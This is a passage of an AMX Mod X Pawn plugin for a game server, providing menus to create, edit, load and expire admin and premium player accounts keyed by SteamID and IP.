	format_time(timeExpired,charsmax(timeExpired),"%d/%m/%Y - %H:%M:%S",Data[p_AccessExpired]);
	if(Data[p_AccessExpired] == 0)
		formatex(timeExpired,charsmax(timeExpired),"Never");
	format_time(LastConnected,charsmax(LastConnected),"%d/%m/%Y - %H:%M:%S",Data[p_LastConnected]);
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dView \r%s \dAccess Account",TAG,Data[p_Name]);
	new pmenu = menu_create(Text,"PremiumAcc_Handler");
	new cb = menu_makecallback("IspUserImmune");
	menu_additem(pmenu,"\wRemove Account",.callback = cb);
	menu_additem(pmenu,"\wEdit Account",.callback = cb);
	formatex(Text,charsmax(Text),"\d- \wSteamID \d[\r%s\d]",Data[p_STEAMID]);
	format(Text,charsmax(Text),"%s^n\d- \wIP \d[\r%s\d]",Text,Data[p_IP]);
	menu_addtext(pmenu,Text);
	formatex(Text,charsmax(Text),"\d- \wAccess Expired \d[\r%s\d]",timeExpired);
	menu_addtext(pmenu,Text);
	formatex(Text,charsmax(Text),"\d- \wLast Connected \d[\r%s\d]",IsPremiumUserOnline(ChoosedAcc[id][0]) ? "Online" : LastConnected);
	menu_addtext(pmenu,Text);
	formatex(Text,charsmax(Text),"\d- \wSave Type \d[\r%s\d]",SaveTypes[Data[p_SaveType]]);
	menu_addtext(pmenu,Text);
	
	menu_display(id,pmenu);
	return 1;
}

public PremiumAcc_Handler(id,menu,Item)
{
	switch(Item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu);
			return View_PremiumAcc(id);
		}
		case 0:
		{
			new Data[PremiumInfo];
			ArrayGetArray(PremiumsList,ChoosedAcc[id][0],Data);
			if(ChoosedAcc[id][1] != 0)
			{
				remove_task(ChoosedAcc[id][1] + 100);
				delete_premium(ChoosedAcc[id][1] + 100)
			}
			else
				ArrayDeleteItem(PremiumsList,ChoosedAcc[id][0]);
			ColorChat(0,"^3%s ^4%s ^1account has been removed",Data[p_Name],PremiumAccess);
		}
		case 1:
		{
			menu_destroy(menu)
			new Data[PremiumInfo];
			ArrayGetArray(PremiumsList,ChoosedAcc[id][0],Data);
			new lTime = Data[p_AccessExpired] - get_systime();
			new months,days,hours;
			while(lTime > (60*60*24*30))
			{
				lTime -= 60*60*24*30;
				months++;
			}
			while(lTime > (60*60*24))
			{
				lTime -= 60*60*24;
				days++;
			}
			while(lTime >(60*60))
			{
				lTime -= 60*60;
				hours++;
			}
			hours++;
			Time[id][Hours] = hours;
			Time[id][Days] = days;
			Time[id][Months] = months;
			SaveType[id] = Data[p_SaveType];
			if(Data[p_AccessExpired] == 0)
			{
				Time[id][Hours] = 0;
				Time[id][Days] = 0;
				Time[id][Months] = -1;
			}
			return Edit_PremiumAcc(id);
		}
	}
	return 1;
}

public Edit_PremiumAcc(id)
{
	new Text[256];
	new Data[PremiumInfo];
	ArrayGetArray(PremiumsList,ChoosedAcc[id][0],Data);
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dEdit \r%s \dPremium Account Menu^n",TAG,Data[p_Name]);
	format(Text,charsmax(Text),"%s^n\d- Player STEAMID \w[\r%s\w]",Text,Data[p_STEAMID]);
	format(Text,charsmax(Text),"%s^n\d- Player IP \w[\r%s\w]",Text,Data[p_IP]);
	new menu = menu_create(Text,"EditPremium_Handler");
	formatex(Text,charsmax(Text),"\wSave Type \d[\r%s\d]",SaveTypes[SaveType[id]]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wHours To Expired: \r%d",Time[id][Hours]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wDays To Expired: \r%d",Time[id][Days]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wMonths To Expired: \r%d",Time[id][Months]);
	menu_additem(menu,Text);
	
	new cb = menu_makecallback("BlockSave");
	menu_additem(menu,"\wSave Account Info",.callback = cb);
	
	menu_display(id,menu);
	return 1;
}
public EditPremium_Handler(id,menu,Item)
{
	switch(Item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu)
			return PremiumAccInfo(id);
		}
		case 0:
		{
			SaveType[id] ++;
			if(SaveType[id] > sizeof SaveTypes -1 )
				SaveType[id] = 0;
		}
		case 1:
		{
			Mode[id] = 4;
			client_cmd(id,"messagemode manage_hours");
			return 1;
		}
		case 2:
		{
			Mode[id] = 4;
			client_cmd(id,"messagemode manage_days");
			return 1;
		}
		case 3:
		{
			Mode[id] = 4;
			client_cmd(id,"messagemode manage_months");
			return 1;
		}
		case 4:
		{
			if(!(get_user_flags(id) & P_ACCESS))
				return ColorChat(id,"You have ^4no access ^1to this command");
			new Data[PremiumInfo];
			Time[id][TotalTime] = ((((Time[id][Months] * 30) + Time[id][Days]) * 24) + Time[id][Hours]) * 3600;
			ArrayGetArray(PremiumsList,ChoosedAcc[id][0],Data);
			Data[p_AccessExpired] = Time[id][TotalTime] + get_systime();
			if(Time[id][Months] == -1)
				Data[p_AccessExpired] = 0;
			Data[p_SaveType] = SaveType[id];
			new timeExpired[40];
			format_time(timeExpired,charsmax(timeExpired),"%d/%m/%Y - %H:%M:%S",Data[p_AccessExpired]);
			ColorChat(0,"^3%s ^4Premium Account ^1has been edited.",Data[p_Name]);
			new Text[128];
			formatex(Text,charsmax(Text),"^3Time Expired ^1has been setted for");
			if(Time[id][Months] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1months^1",Text,Time[id][Months]);
			if(Time[id][Days] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1days^1",Text,Time[id][Days]);
			if(Time[id][Hours] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1hours^1",Text,Time[id][Hours]);
			if(Data[p_AccessExpired] == 0)
			{
				formatex(Text,charsmax(Text),"for ^4Permanent^1");
				formatex(timeExpired,charsmax(timeExpired),"Never");
			}
			format(Text,charsmax(Text),"%s, until ^3%s",Text,timeExpired);
			ColorChat(0,"%s",Text);
			if(task_exists(ChoosedAcc[id][1]+100))
			{
				remove_task(ChoosedAcc[id][1]+100);
				new Float:Timer = float(Time[id][TotalTime]);
				if(Data[p_AccessExpired] != 0)
					set_task(Timer,"delete_premium",ChoosedAcc[id][1]+100);
			}
			ArraySetArray(PremiumsList,ChoosedAcc[id][0],Data);
			return PremiumAccInfo(id);
		}
		
	}
	menu_destroy(menu)
	return Edit_PremiumAcc(id);
}

public Create_AccessAcc(id)
{
	new Text[128];
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dCreate a New Access Account Menu",TAG);
	new menu = menu_create(Text,"CreateAccess_Handler");
	if(Player[id] != 0)
	{
		formatex(Text,charsmax(Text),"\wPlayer \d[\r%s\d]",get_name(Player[id]));
		format(Text,charsmax(Text),"%s^n\d- Player STEAMID \w[\r%s\w]",Text,get_auth(Player[id]));
		format(Text,charsmax(Text),"%s^n\d- Player IP \w[\r%s\w]",Text,get_ip(Player[id]));
		menu_additem(menu,Text);
	}
	else
	{
		formatex(Text,charsmax(Text),"\wPlayer \d[\r%s\d]","None");
		format(Text,charsmax(Text),"%s^n\d- Player STEAMID \w[\r%s\w]",Text,"None");
		format(Text,charsmax(Text),"%s^n\d- Player IP \w[\r%s\w]",Text,"None");
		menu_additem(menu,Text);
	}
	formatex(Text,charsmax(Text),"\wPlayer Access \d[\r%s\d]",AdminsAccess[Access[id]][l_Name]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wSave Type \d[\r%s\d]",SaveTypes[SaveType[id]]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wHours To Expired: \r%d",Time[id][Hours]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wDays To Expired: \r%d",Time[id][Days]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wMonths To Expired: \r%d",Time[id][Months]);
	menu_additem(menu,Text);
	
	new cb = menu_makecallback("BlockCreate");
	menu_additem(menu,"\wCreate a New Account",.callback = cb);
	
	menu_display(id,menu);
	return 1;
}

public CreateAccess_Handler(id,menu,Item)
{
	switch(Item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu)
			return Create_AccountType(id);
		}
		case 0:
			return CreateAccess_Players(id)
		case 1:
		{
			Access[id] ++;
			if(Access[id] > A_MANAGER )
				Access[id] = A_DONATOR;
		}
		case 2:
		{
			SaveType[id] ++;
			if(SaveType[id] > sizeof SaveTypes -1 )
				SaveType[id] = 0;
		}
		case 3:
		{
			Mode[id] = 1;
			client_cmd(id,"messagemode manage_hours");
			return 1;
		}
		case 4:
		{
			Mode[id] = 1;
			client_cmd(id,"messagemode manage_days");
			return 1;
		}
		case 5:
		{
			Mode[id] = 1;
			client_cmd(id,"messagemode manage_months");
			return 1;
		}
		case 6:
		{
			if(!(get_user_flags(id) & P_ACCESS))
				return ColorChat(id,"You have ^4no access ^1to this command");
			new Data[AdminInfo];
			Time[id][TotalTime] = ((((Time[id][Months] * 30) + Time[id][Days]) * 24) + Time[id][Hours]) * 3600;
			Data[a_AccessExpired] = Time[id][TotalTime] + get_systime();
			if(Time[id][Months] == -1)
				Data[a_AccessExpired] = 0;
			Data[a_Access] = Access[id];
			Data[a_SaveType] = SaveType[id];
			Data[a_Name] = get_name(Player[id]);
			Data[a_STEAMID] = get_auth(Player[id]);
			Data[a_IP] = get_ip(Player[id]);
			Data[a_LastConnected] = get_systime();
			new timeExpired[40];
			format_time(timeExpired,charsmax(timeExpired),"%d/%m/%Y - %H:%M:%S",Data[a_AccessExpired]);
			ColorChat(0,"^3%s ^1has been promoted as ^4%s",Data[a_Name],AdminsAccess[Data[a_Access]][l_Name]);
			new Text[128];
			formatex(Text,charsmax(Text),"for");
			if(Time[id][Months] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1months^1",Text,Time[id][Months]);
			if(Time[id][Days] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1days^1",Text,Time[id][Days]);
			if(Time[id][Hours] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1hours^1",Text,Time[id][Hours]);
			if(Data[a_AccessExpired] == 0)
			{
				formatex(Text,charsmax(Text),"for ^4Permanent^1");
				formatex(timeExpired,charsmax(timeExpired),"Never");
			}
			format(Text,charsmax(Text),"%s, until ^3%s",Text,timeExpired);
			ColorChat(0,"%s",Text);
			new Float:Timer = float(Time[id][TotalTime]);
			if(Data[a_AccessExpired] != 0)
				set_task(Timer,"delete_admin",Player[id]);
			new flags = read_flags(AdminsAccess[Data[a_Access]][l_Flags]);
			set_user_flags(Player[id],flags);
			ArrayPushArray(AdminsList,Data);
			return 1;
		}
		
	}
	menu_destroy(menu)
	return Create_AccessAcc(id);
}
public Create_PremiumAcc(id)
{
	new Text[128];
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dCreate New Premium Account Menu",TAG);
	new menu = menu_create(Text,"CreatePremium_Handler");
	if(Player[id] != 0)
	{
		formatex(Text,charsmax(Text),"\wPlayer \d[\r%s\d]",get_name(Player[id]));
		format(Text,charsmax(Text),"%s^n\d- Player STEAMID \w[\r%s\w]",Text,get_auth(Player[id]));
		format(Text,charsmax(Text),"%s^n\d- Player IP \w[\r%s\w]",Text,get_ip(Player[id]));
		menu_additem(menu,Text);
	}
	else
	{
		formatex(Text,charsmax(Text),"\wPlayer \d[\r%s\d]","None");
		format(Text,charsmax(Text),"%s^n\d- Player STEAMID \w[\r%s\w]",Text,"None");
		format(Text,charsmax(Text),"%s^n\d- Player IP \w[\r%s\w]",Text,"None");
		menu_additem(menu,Text);
	}
	formatex(Text,charsmax(Text),"\wSave Type \d[\r%s\d]",SaveTypes[SaveType[id]]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wHours To Expired: \r%d",Time[id][Hours]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wDays To Expired: \r%d",Time[id][Days]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wMonths To Expired: \r%d",Time[id][Months]);
	menu_additem(menu,Text);
	new cb = menu_makecallback("BlockCreate");
	menu_additem(menu,"\wCreate a New Account",.callback = cb);
	
	menu_display(id,menu);
	return 1;
}

public CreatePremium_Handler(id,menu,Item)
{
	switch(Item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu)
			return Create_AccountType(id);
		}
		case 0:
			return CreatePremium_Players(id)
		case 1:
		{
			SaveType[id] ++;
			if(SaveType[id] > sizeof SaveTypes -1 )
				SaveType[id] = 0;
		}
		case 2:
		{
			Mode[id] = 2;
			client_cmd(id,"messagemode manage_hours");
			return 1;
		}
		case 3:
		{
			Mode[id] = 2;
			client_cmd(id,"messagemode manage_days");
			return 1;
		}
		case 4:
		{
			Mode[id] = 2;
			client_cmd(id,"messagemode manage_months");
			return 1;
		}
		case 5:
		{
			if(!(get_user_flags(id) & P_ACCESS))
				return ColorChat(id,"You have ^4no access ^1to this command");
			//for(new i; < Arr
			new Data[PremiumInfo];
			Time[id][TotalTime] = ((((Time[id][Months] * 30) + Time[id][Days]) * 24) + Time[id][Hours]) * 3600;
			Data[p_AccessExpired] = Time[id][TotalTime] + get_systime();
			if(Time[id][Months] == -1)
				Data[p_AccessExpired] = 0;
			Data[p_SaveType] = SaveType[id];
			Data[p_Name] = get_name(Player[id]);
			Data[p_STEAMID] = get_auth(Player[id]);
			Data[p_IP] = get_ip(Player[id]);
			Data[p_LastConnected] = get_systime();
			new timeExpired[40];
			format_time(timeExpired,charsmax(timeExpired),"%d/%m/%Y - %H:%M:%S",Data[p_AccessExpired]);
			ColorChat(0,"^3%s ^1has been promoted as ^4%s",Data[a_Name],PremiumAccess);
			new Text[128];
			formatex(Text,charsmax(Text),"for");
			if(Time[id][Months] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1months^1",Text,Time[id][Months]);
			if(Time[id][Days] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1days^1",Text,Time[id][Days]);
			if(Time[id][Hours] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1hours^1",Text,Time[id][Hours]);
			if(Data[p_AccessExpired] == 0)
			{
				formatex(Text,charsmax(Text),"for ^4Permanent^1");
				formatex(timeExpired,charsmax(timeExpired),"Never");
			}
			format(Text,charsmax(Text),"%s, until ^3%s",Text,timeExpired);
			ColorChat(0,"%s",Text);
			new Float:Timer = float(Time[id][TotalTime]);
			if(Data[p_AccessExpired] != 0)
				set_task(Timer ,"delete_premium",Player[id]+100);
			Premium[Player[id]] = true;
			ArrayPushArray(PremiumsList,Data);
			return 1;
		}
	}
	menu_destroy(menu)
	return Create_PremiumAcc(id);
}
public CreateAccess_Players(id)
{
	new Text[128],pnum,players[32],Info[2];
	get_players(players,pnum,"h");
	//get_players(players,pnum,"ch");
	
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dCreate New Access Account Menu^n\rChoose Player",TAG);
	new Menu = menu_create(Text,"CreateAccess_Players_Handler");
	new counter;
	for(new i; i < pnum; i++)
	{
		new Player = players[i];
		Info[0] = Player;
		if(get_user_flags(Player) & ADMIN_CHAT)
			continue;
		menu_additem(Menu,get_name(Player),Info);
		counter ++;
	}
	if(counter < 1)
		return ColorChat(id,"there are ^3no players ^1to create ^4Access Account");
	menu_setprop(Menu,MPROP_EXITNAME,"Back");
	menu_display(id,Menu)
	return 1;
}
public CreateAccess_Players_Handler(id,menu,Item)
{
	if(Item == MENU_EXIT)
	{
		menu_destroy(menu)
		return Create_AccessAcc(id)
	}
	new szData[2],Empty;
	menu_item_getinfo(menu,Item,Empty,szData,charsmax(szData),_,_,Empty);
	Player[id] = szData[0];
	menu_destroy(menu)
	return Create_AccessAcc(id);
}
public CreatePremium_Players(id)
{
	new Text[128],pnum,players[32],Info[2];
	get_players(players,pnum,"h");
	//get_players(players,pnum,"ch");
	
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dCreate New Access Account Menu^n\rChoose Player",TAG);
	new Menu = menu_create(Text,"CreatePremium_Players_Handler");
	new counter;
	for(new i; i < pnum; i++)
	{
		new Player = players[i];
		Info[0] = Player;
		if(Premium[Player])
			continue;
		menu_additem(Menu,get_name(Player),Info);
		counter ++;
	}
	if(counter < 1)
		return ColorChat(id,"there are ^3no players ^1to create ^4Premium Account");
	menu_setprop(Menu,MPROP_EXITNAME,"Back");
	menu_display(id,Menu)
	return 1;
}
public CreatePremium_Players_Handler(id,menu,Item)
{
	if(Item == MENU_EXIT)
	{
		menu_destroy(menu)
		return Create_PremiumAcc(id)
	}
	new szData[2],Empty;
	menu_item_getinfo(menu,Item,Empty,szData,charsmax(szData),_,_,Empty);
	Player[id] = szData[0];
	menu_destroy(menu)
	return Create_PremiumAcc(id);
}

stock get_name(index)
{
	new szName[33];
	get_user_name(index,szName,charsmax(szName));
	return szName;
}
stock get_ip(index)
{
	static szAuth[20];
	get_user_ip(index,szAuth,charsmax(szAuth),1);
	return szAuth;
	
}

stock get_auth(index)
{	
	static szAuth[40];
	get_user_authid(index,szAuth,charsmax(szAuth));
	if(contain(szAuth,"VALVE_")!=-1||contain(szAuth,"ID_LAN")!=-1)
	get_user_ip(index,szAuth,charsmax(szAuth),1);
	return szAuth;
}
public delete_admin(index)
{
	new Data[AdminInfo],PlayerKey[60],DataKey[60];
	formatex(PlayerKey,charsmax(PlayerKey),"%s%s",get_auth(index),get_ip(index));
	for(new i; i < ArraySize(AdminsList); i++)
	{
		ArrayGetArray(AdminsList,i,Data);
		formatex(DataKey,charsmax(DataKey),"%s%s",Data[a_STEAMID],Data[a_IP]);
		switch(Data[a_SaveType])
		{
			case 0:
				if(!equali(get_auth(index),Data[a_STEAMID]))
					continue;
			case 1:
				if(!equali(get_ip(index),Data[a_IP]))
					continue;
			case 2:
				if(!equali(PlayerKey,DataKey))
					continue;
		}
		new flags = read_flags("abcdefghijklmnopqrstu");
		remove_user_flags(index,flags);
		ColorChat(index,"Your ^3%s Account ^1has been ^4Expired",AdminsAccess[Data[a_Access]][l_Name]);
		log_amx("Debug Delete Item");
		ArrayDeleteItem(AdminsList,i);
	}
}
public delete_premium(index)
{
	index -= 100;
	new Data[PremiumInfo],PlayerKey[60],DataKey[60];
	formatex(PlayerKey,charsmax(PlayerKey),"%s%s",get_auth(index),get_ip(index));
	for(new i; i < ArraySize(PremiumsList); i++)
	{
		ArrayGetArray(PremiumsList,i,Data);
		formatex(DataKey,charsmax(DataKey),"%s%s",Data[p_STEAMID],Data[p_IP]);
		switch(Data[p_SaveType])
		{
			case 0:
				if(!equali(get_auth(index),Data[p_STEAMID]))
					continue;
			case 1:
				if(!equali(get_ip(index),Data[p_IP]))
					continue;
			case 2:
				if(!equali(PlayerKey,DataKey))
					continue;
		}
		Premium[index] = false;
		ColorChat(index,"Your ^3%s Account ^1has been ^4Expired",PremiumAccess);
		ArrayDeleteItem(PremiumsList,i);
	}
}
public LoadAccessAcc(index)
{
	new rflags = read_flags("abcdefghijklmnopqrstu")
	remove_user_flags(index,rflags);
	new PlayerKey[60],DataKey[60],Data[AdminInfo];
	formatex(PlayerKey,charsmax(PlayerKey),"%s%s",get_auth(index),get_ip(index));
	for(new i; i < ArraySize(AdminsList); i++)
	{
		ArrayGetArray(AdminsList,i,Data);
		formatex(DataKey,charsmax(DataKey),"%s%s",Data[a_STEAMID],Data[a_IP]);
		switch(Data[a_SaveType])
		{
			case 0:
				if(!equali(get_auth(index),Data[a_STEAMID]))
					continue;
			case 1:
				if(!equali(get_ip(index),Data[a_IP]))
					continue;
			case 2:
				if(!equali(PlayerKey,DataKey))
					continue;
		}
		if(Data[a_AccessExpired] > get_systime())
		{
			new Float:Timer = float(Data[a_AccessExpired] - get_systime());
			set_task(Timer,"delete_admin",index);
			new flags = read_flags(AdminsAccess[Data[a_Access]][l_Flags]);
			set_user_flags(index,flags);
			Data[a_Name] = get_name(index);
			Data[a_STEAMID] = get_auth(index);
			Data[a_IP] = get_ip(index);
			Data[a_LastConnected] = get_systime();
			ArraySetArray(AdminsList,i,Data);
		}
		else
		{
			if(Data[a_AccessExpired] != 0)
				ArrayDeleteItem(AdminsList,i);
			else
			{
				new flags = read_flags(AdminsAccess[Data[a_Access]][l_Flags]);
				set_user_flags(index,flags);				
				Data[a_Name] = get_name(index);
				Data[a_STEAMID] = get_auth(index);
				Data[a_IP] = get_ip(index);
				Data[a_LastConnected] = get_systime();
				ArraySetArray(AdminsList,i,Data);
			}
		}
		break;
	}
}
	
public LoadPremiumAcc(index)
{
	Premium[index] = false;
	new PlayerKey[60],DataKey[60],Data[PremiumInfo];
	formatex(PlayerKey,charsmax(PlayerKey),"%s%s",get_auth(index),get_ip(index));
	for(new i; i < ArraySize(PremiumsList); i++)
	{
		ArrayGetArray(PremiumsList,i,Data);
		formatex(DataKey,charsmax(DataKey),"%s%s",Data[p_STEAMID],Data[p_IP]);
		switch(Data[p_SaveType])
		{
			case 0:
				if(!equali(get_auth(index),Data[p_STEAMID]))
					continue;
			case 1:
				if(!equali(get_ip(index),Data[p_IP]))
					continue;
			case 2:
				if(!equali(PlayerKey,DataKey))
					continue;
		}
		if(Data[p_AccessExpired] > get_systime())
		{
			new Float:Timer = float(Data[p_AccessExpired] - get_systime());
			set_task(Timer,"delete_premium",index+100);
			Premium[index] = true;
			
			Data[p_Name] = get_name(index);
			Data[p_STEAMID] = get_auth(index);
			Data[p_IP] = get_ip(index);
			Data[p_LastConnected] = get_systime();
			ArraySetArray(PremiumsList,i,Data);
		}
		else
		{
			if(Data[p_AccessExpired] != 0)
				ArrayDeleteItem(PremiumsList,i);
			else
			{
				Premium[index] = true;
				Data[p_Name] = get_name(index);
				Data[p_STEAMID] = get_auth(index);
				Data[p_IP] = get_ip(index);
				Data[p_LastConnected] = get_systime();
				ArraySetArray(PremiumsList,i,Data);
			}
		}
		break;
	}
}

stock IsAccessUserOnline(ArrayItem)
{
	new Data[AdminInfo];
	ArrayGetArray(AdminsList,ArrayItem,Data);
	switch(Data[a_SaveType])
	{
		case 0:
		{
			for(new i; i <= MaxPlayers; i++)
			{
				if(!(equali(get_auth(i),Data[a_STEAMID])))
					continue;
				return i;
			}
		}
		case 1:
		{
			for(new i; i <= MaxPlayers; i++)
			{
				if(!(equali(get_ip(i),Data[a_IP])))
					continue;
				return i;
			}
		}
		case 2:
		{
			for(new i; i <= MaxPlayers; i++)
			{
				if(!(equali(get_auth(i),Data[a_STEAMID]) && equali(get_ip(i),Data[a_IP])))
					continue;
				return i;
			}
		}
	}
	return 0;
}

stock IsPremiumUserOnline(ArrayItem)
{
	new Data[PremiumInfo];
	ArrayGetArray(PremiumsList,ArrayItem,Data);
	switch(Data[p_SaveType])
	{
		case 0:
		{
			for(new i; i <= MaxPlayers; i++)
			{
				if(!(equali(get_auth(i),Data[p_STEAMID])))
					continue;
				return i;
			}
		}
		case 1:
		{
			for(new i; i <= MaxPlayers; i++)
			{
				if(!(equali(get_ip(i),Data[p_IP])))
					continue;
				return i;
			}
		}
		case 2:
		{
			for(new i; i <= MaxPlayers; i++)
			{
				if(!(equali(get_auth(i),Data[p_STEAMID]) && equali(get_ip(i),Data[p_IP])))
					continue;
				return i;
			}
		}
	}
	return 0;
}

stock ColorChat( const iPlayer, const szMsg[ ], { Float, Sql, Resul, _ } : ... )        
{
	new iMsg[ 191 ], iPlayers[ 32 ], iCount = 1;
	static iLen;
	iLen = formatex( iMsg, charsmax( iMsg ), "^4[^1 %s ^4] ^1",Chat_TAG );
	vformat( iMsg[ iLen ], charsmax( iMsg ) - iLen, szMsg, 3 );
	if ( iPlayer )
		iPlayers[ 0 ] = iPlayer;
	else    
		get_players( iPlayers, iCount, "ch" );  
	for ( new i = 0; i < iCount; i++ )
	{
		if ( ! is_user_connected( iPlayers[ i ] ) )
			continue;
		message_begin( MSG_ONE_UNRELIABLE, get_user_msgid( "SayText" ), _,iPlayers[ i ] );
		write_byte( iPlayers[ i ] );
		write_string( iMsg );
		message_end( );
	}
	return 1;
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ fbidis\\ ansi\\ ansicpg1252\\ deff0{\\ fonttbl{\\ f0\\ fnil\\ fcharset0 Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ ltrpar\\ lang1037\\ f0\\ fs16 \n\\ par }
*/
